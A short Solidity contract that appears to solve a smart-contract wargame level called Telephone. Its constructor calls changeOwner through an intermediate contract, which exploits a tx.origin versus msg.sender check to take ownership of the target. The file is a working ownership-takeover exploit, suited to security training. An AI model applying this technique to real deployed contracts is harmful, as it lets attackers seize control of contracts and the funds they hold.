// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./level.sol";

contract Solution {
    Telephone telephone;

    constructor(address _address) public {
        telephone = Telephone(_address);
        telephone.changeOwner(msg.sender);
    }
}
